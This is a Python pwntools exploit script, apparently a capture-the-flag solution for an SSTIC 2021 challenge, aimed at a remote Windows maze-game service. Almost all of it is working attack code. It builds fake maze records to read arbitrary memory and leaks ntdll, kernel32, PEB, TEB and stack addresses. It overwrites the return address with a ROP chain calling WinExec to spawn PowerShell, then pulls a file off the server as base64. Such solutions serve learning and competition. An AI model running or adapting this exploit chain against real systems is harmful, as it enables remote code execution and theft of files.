from pwn import *
import os

# context.update(log_level='debug')
context.update(arch='amd64')

local = False
if local:
    s = remote('172.16.113.128', 4444)
    ntdll = 0x7ff88c9f0000
else:
    uid = open('uid.txt', 'rb').read().strip()
    s = remote('challenge2021.sstic.org', 4577)
    s.sendline(uid)
    # from heap leak
    ntdll = 0x7fffecbda2c0 - 0x16a2c0

_menucount = 1
def menu(n):
    global _menucount
    _menucount += 1
    s.sendline(str(n))

def menusync():
    global _menucount
    for i in range(_menucount):
        s.recvuntil('8. Exit\r\n')
    _menucount = 0

def register(name):
    menu(1)
    s.sendline(name)

def load(x):
    menu(3)
    s.sendline(str(x))

def scoreboard():
    menusync()
    menu(6)
    return s.recvuntil('\r\nMenu\r\n\r\n', drop=True)

register('A')
load('leak.rank')
leak = scoreboard()
leak = leak.split(b'created by ', 1)[1]
heapaddr = u64(leak[0x80:0x86] + b'\0\0')
log.info("leaked heap address: 0x%x", heapaddr)

def is_ok_addr(addr):
    saddr = p64(addr).rstrip(b'\0')
    for c in saddr:
        if c == 0 or bytes([c]).isspace():
            return False
    return True

def make_fake_maze(addr):
    saddr = p64(addr).rstrip(b'\0')
    assert is_ok_addr(addr), "address 0x%x cannot be used" % addr

    lsb = saddr[0]
    iters = ((lsb - 1) * 11 + 135) // 136
    width = 127 - (iters + 3 + len(saddr))
    name = bytearray()
    name += b'A' * iters
    name += b'\4' # type
    name += bytes([width, 1]) # width, height
    name += b'B' * width # grid data
    name += saddr # num traps + trap[0].score
    assert len(name) == 127

    register(bytes(name))

    # Note: maze name must not start with a number!
    mazename = 'X' + os.urandom(8).hex()
    menu(2) # create
    s.sendline('1') # classic
    s.sendline('c') # custom
    s.sendline('3') # w = h = 5
    s.sendline('3')
    s.sendline('y') # save
    s.sendline(mazename) # save
    for i in range(iters + 1):
        menu(4) # play
        # <q >d ^z vs
        s.sendline('d')

    load(mazename + '.rank')
    return width

def do_leak(addr):
    lsb = addr & 0xff
    if not is_ok_addr(addr >> 8) or (lsb == 0 and not is_ok_addr((addr >> 8) - 1)):
        # cannot leak this address
        return b'\xcc'

    if lsb == 0 or lsb == 32:
        offset = 1
    elif lsb in (9, 10, 11, 12, 13):
        offset = lsb - 8
    else:
        offset = 0

    addr -= offset
    log.info("Leaking address 0x%x (offset %d)", addr, offset)
    width = make_fake_maze(addr)
    menusync()
    menu(4) # play
    leak = s.recvuntil(b'\r\n-*-*-*-*-*-*-*', drop=True)

    s.sendline('x') # quit playing
    menu(5) # remove
    s.sendline('y') # confirm remove

    if len(leak) != width and b'\r\n' in leak:
        log.info("Correcting for CRLF")
        leak = leak.replace(b'\r\n', b'\n')
    assert len(leak) == width
    return leak[offset:]

def do_leak_range(addr, sz):
    limit = addr + sz
    buf = bytearray()
    while addr < limit:
        leak = do_leak(addr)
        log.info("  Leaked %s", leak.hex())
        buf += leak
        addr += len(leak)
    return buf[:sz]

# pause() # give time to attach WinDBG locally

# heap_leak = do_leak_range(heapaddr, 0x400) # used for leaking ntdll
ntdll_leak = do_leak_range(ntdll + 0x16a400, 0x100)
ntdll_leak2 = do_leak_range(ntdll + 0x16b178, 0x100)

kernel32 = u64(ntdll_leak2[:8]) - 0x428f0
log.info("kernel32: 0x%x", kernel32)
kernelbase = u64(ntdll_leak2[16:24]) - 0x74a50
log.info("kernelbase: 0x%x", kernelbase)

exe_base = u64(ntdll_leak[8:16]) - 0xf8
log.info("exe base: 0x%x", exe_base)
peb_addr = u64(ntdll_leak[0x48:0x50]) - 0x80
log.info("peb: 0x%x", peb_addr)
# TEBs follow PEB in memory
teb0_addr = peb_addr + 0x1000

teb = do_leak_range(teb0_addr, 0x100)
stack_top, stack_bottom = u64(teb[8:16]), u64(teb[16:24])
log.info("stack range: [0x%x, 0x%x]", stack_bottom, stack_top)

# search for main() return address
stack_leak = do_leak_range(stack_top - 0x800, 0x600)
for i in range(0, len(stack_leak), 8):
    if u64(stack_leak[i:i+8]) == exe_base + 0x5e58:
        rip_addr = stack_top - 0x800 + i
        break
log.info("rip is at 0x%x", rip_addr)

# "upgrade" the maze from "classic" to "multipass with traps"
# this copies the fake classic maze pointer to the multipass maze pointer
width = make_fake_maze(rip_addr)
menu(7)
s.sendline('y')
s.sendline('0') # walls to remove
s.sendline('y') # multipass with traps
s.sendline('0') # number of traps
s.sendline('12345') # score for traps
s.sendline('n') # do not save

# "upgrade" the maze again, which lets us simply write new maze contents
# using `fgets`. We'll get around 100 bytes of usable ROP space.
menu(7)
s.sendline('y')
# to test that the ROP works
# rop = flat([
#     ntdll + 0x8fe91, # pop rcx; ret
#     exe_base + 0x7B20, # "working dir"
#     exe_base + 0x1070, # printf
# ])
rop = flat([
    ntdll + 0x8c557, # pop rdx; pop r11; ret
    1,
    0,
    ntdll + 0x8fe91, # pop rcx; ret
    rip_addr + 0x30,
    kernel32 + 0x65f80, # WinExec
#    ntdll + 0xdd1b, # eb fe
]) + b'powershell\0'
log.info("ropchain: %d of %d allowable bytes", len(rop), width)
s.sendline(rop)
s.sendline()

menu(8)

s.recvuntil('PS C:\\users\\challenge\\maze')
# failed attempts: format-hex and ReadAllBytes are extremely slow and do not complete within the 10 minute timeout
# s.sendline('format-hex C:\\users\\challenge\\Desktop\\DRM.zip')
# s.sendline('[System.IO.File]::ReadAllBytes("C:\\users\\challenge\\Desktop\\DRM.zip")')
s.sendline('''
function ConvertTo-Base64
{
    $SourceFilePath = "C:\\\\users\\\\challenge\\\\Desktop\\\\DRM.zip"
    $bufferSize = 9000
    $buffer = New-Object byte[] $bufferSize
    $reader = [System.IO.File]::OpenRead($SourceFilePath)
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        [Convert]::ToBase64String($buffer, 0, $bytesRead);
    } while ($bytesRead -eq $bufferSize);

    $reader.Dispose()
}
ConvertTo-Base64
''')

s.recvuntil('>> ConvertTo-Base64')
s.recvuntil('>> ')
out = s.recvuntil('PS ', drop=True)
import base64
open('DRM.zip', 'wb').write(base64.b64decode(out))
